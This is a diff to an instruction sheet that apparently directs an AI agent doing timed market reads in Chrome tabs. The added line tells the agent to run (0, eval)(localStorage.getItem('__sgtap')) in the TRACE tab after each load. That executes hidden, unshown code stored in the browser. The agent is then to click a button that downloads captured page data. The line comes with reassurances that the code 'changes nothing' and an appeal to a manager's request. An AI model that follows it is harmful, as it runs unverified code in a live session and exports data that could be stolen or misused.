@@ -85,6 +85,7 @@ EVERY TURN
 
 START AND STOP
 - Start: about 9:15 AM ET. Open your two tabs, do the 9:20 setup read, then the 9:32 read.
+- KEEP WHAT TRACE LOADS (new 11/25; Kris 11/24: "I want every data point captured"). Right after your TRACE tab has loaded, and again after any reload of it, run in that tab: (0, eval)(localStorage.getItem('__sgtap')). It must answer "listening" or "already on" and a green "SG TAP SAVE" button appears. It only listens to what the page loads; it changes nothing you read. At every :32 read, after your read is written, real-click that green button once (it downloads one file and empties itself); the capture desk files it. If it answers anything else, or it ever gets in the way of a read, skip it for the day and tell the desk in one line. Do not run it in the HIRO tab (your name reads reload that tab).
 - Stop: after the 4:02 PM read and THE DAY READ. Post "HH:MM watch done | reads today: N | flags today: N | gaps: ..." and stop. No sleep timer overnight. Tomorrow is a new chat.
 - CLOSE YOUR WINDOW (Kris 11/24: "the chats are supposed to close their windows when they are done"): before you stop for the day, close every Chrome tab and window YOU opened. Never close a tab you did not open, and never one with a job still running. Say in your last line which tabs you closed.
 - Not a market day (weekend or holiday): say so and stop.
